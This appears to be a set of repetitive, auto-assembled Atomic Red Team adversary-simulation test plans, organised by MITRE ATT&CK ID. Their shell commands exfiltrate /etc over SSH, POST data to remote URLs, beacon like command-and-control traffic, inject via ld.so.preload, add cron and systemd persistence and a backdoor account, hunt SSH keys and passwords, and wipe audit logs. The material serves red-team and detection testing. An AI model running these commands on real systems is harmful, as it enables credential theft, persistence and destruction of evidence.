ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1064 ,T1040 ,T1135 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1153 ,T1040 ,T1057 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1136 ,T1064 ,T1145 ,T1087 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1168 ,T1154 ,T1081 ,T1057 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1158 ,T1154 ,T1081 ,T1083 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1158 ,T1153 ,T1139 ,T1201 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1158 ,T1154 ,T1139 ,T1082 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1064 ,T1040 ,T1087 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1064 ,T1081 ,T1018 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1215 ,T1064 ,T1145 ,T1069 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1069: Permission Groups Discovery
groups


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1215 ,T1064 ,T1139 ,T1217 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1158 ,T1064 ,T1139 ,T1069 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1168 ,T1154 ,T1139 ,T1033 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1136 ,T1064 ,T1139 ,T1057 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1158 ,T1154 ,T1145 ,T1018 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
